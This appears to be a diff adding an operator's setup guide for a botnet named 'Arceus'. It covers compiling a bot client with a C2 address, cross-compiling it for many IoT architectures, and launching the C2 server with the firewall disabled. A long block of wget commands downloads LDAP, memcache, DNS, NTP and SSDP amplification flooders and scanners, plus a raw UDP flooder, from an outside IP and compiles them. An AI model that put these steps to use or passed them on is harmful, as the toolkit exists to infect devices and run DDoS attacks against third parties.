@@ -1,0 +1,102 @@
+Arceus I - PrG
+
+///////////////////////////
+/Dependencies And Packages/
+///////////////////////////
+
+yum update -y
+yum install python-paramiko gcc screen nano wget httpd iptables perl php php-pear -y
+yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y
+yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y
+yum install epel-release -y
+yum install gengetopt -y
+yum install bzip2 -y
+yum install lbzip2 -y
+
+
+/////////////////////////////////////////
+/Compiling And Setting up our bot/client/
+/////////////////////////////////////////
+
+Go into the client.c file, and change out the IP and BotPort within line: 41
+After doing so, go ahead and save it onto your server.
+when finished, put the alcues.py file on the server and run the following command
+
+python alcues.py client.c <serverIP>
+Ex: python alcues.py client.c 185.244.25.111
+After Doing so, it will ask if you would like to install all Cross-Compilers, enter Y and hit ENTER
+
+
+////////////////////////////////////
+/Setting Up The C2 and Compiling it/
+////////////////////////////////////
+
+nano /usr/include/bits/typesizes.h      	         // Scroll down until you see || #define __FD_SETSIZE            1024    || change the "1024" to 1000000
+ulimit -n 999999                         	        // Changing ULIMIT
+nano alceus.c                                          // Go into the alceus.c and find the IPLOOKUP function, and change the IP within the function, this will fix the Lookup function!
+gcc -o alceus alceus.c -pthread           	      // Compiles the c2
+rm -rf alceus.c                                      // removes / Deletes the raw .c file for the c2
+screen ./arceus <botport> <threads> <screenport>    // Screens the C2 || botport = the changed selection inside of the bot, use the same number! || threads = threads we are using to screen the c2 on, set as a high number! can not go over 1000! || ScreenPort = The port we want to connect on, this will open the port and allow us to login to the C2 and Use it!
+mv /root/iplookup.php /var/www/html                // Moving the IPGeolocation API into the HTML Directory!
+cd /var/www/html && cat iplookup.php >> api.php   // Moving into HTML directory and catting/moving the code from <iplookup.php> into <api.php>
+nano arc.py                                      // This is for the IPHM Installation for owner accounts!
+< IF YOU CAN NOT LOGIN TO THE C2 AND A LOGIN IS NOT PROMPT'D, RUN THE FOLLOWING COMMAND! >
+<IF OS == "CentOS 6": <service iptables stop>
+<IF OS == "CentOS 7": <service firewalld stop>
+
+////////////////////////
+/Moving Cross-Compilers/
+////////////////////////
+
+mv /root/cross-compiler-mips /root/Cross-Compilers/
+mv /root/cross-compiler-mipsel /root/Cross-Compilers/
+mv /root/cross-compiler-powerpc /root/Cross-Compilers/
+mv /root/cross-compiler-armv5l /root/Cross-Compilers/
+mv /root/cross-compiler-armv6l /root/Cross-Compilers/
+mv /root/cross-compiler-powerpc-440fp /root/Cross-Compilers/
+mv /root/cross-compiler-i586 /root/Cross-Compilers/
+mv /root/cross-compiler-sh4 /root/Cross-Compilers/
+mv /root/cross-compiler-i686 /root/Cross-Compilers/
+mv /root/cross-compiler-sparc /root/Cross-Compilers/
+mv /root/cross-compiler-m68k /root/Cross-Compilers/
+mv /root/cross-compiler-x86_64 /root/Cross-Compilers/
+mv /root/cross-compiler-armv4l /root/Cross-Compilers/
+
+
+
+/////////////////////////////
+/Setting Up Scripts And IPHM/
+/////////////////////////////
+All files must be put into the directory /amp/ on the root dir
+
+after doing so, put ALL files inside of this folder, no subfolders within this folder, like /root/amp/ldap/ldapscan, ldap, ldap.txt
+all files must be in amp.
+
+mkdir amp; cd amp
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/ldap/ldap.c -O ldap.c && gcc -o ldap ldap.c -pthread; rm -rf ldap.c 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/ldap/ldapscan.c -O ldapscan.c && gcc -o ldapscan ldapscan.c -pthread; rm -rf ldapscan.c 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/ldapv2/ldapv2 -O ldapv2 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/memcache/memcache -O memcache 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/memcache/memcachescan -O memcachescan 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/dns/dnsamp.c -O dns.c && gcc -o dns dns.c -pthread; rm -rf dns.c 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/dns/dnsscan.c -O dnsscan.c && gcc -o dnsscan dnsscan.c -pthread; rm -rf dnsscan.c 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/ntp/ntp.c -O ntp.c && gcc -o ntp ntp.c -pthread; rm -rf ntp.c 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/ntp/ntpscan.c -O ntpscan.c && gcc -o ntpscan ntpscan.c -pthread; rm -rf ntpscan.c 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/ssdp/ssdp.c -O ssdp.c && gcc -o ssdp ssdp.c -pthread; rm -rf ssdp.c 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Sources/ssdp/ssdpscan.c -O ssdpscan.c && gcc -o ssdpscan ssdpscan.c -pthread; rm -rf ssdpscan.c 
+wget -q http://98.143.148.177/Archive/reprobate/layer4/UDP/Raw_Collection/rawudp.c -O rawudp.c && gcc -o rawudp rawudp.c -pthread; rm -rf rawudp.c && chmod 777 * && cd
+
+
+
+//////////////////////
+/Fixing Server Issues/
+//////////////////////
+
+1: Screen Stopping after trying to login     // This Could be that you do not have a login within the login file, in arceus's case it will be arceus.txt || echo Username password admin >> arceus.txt
+2: 
+
+
+
+
+
+
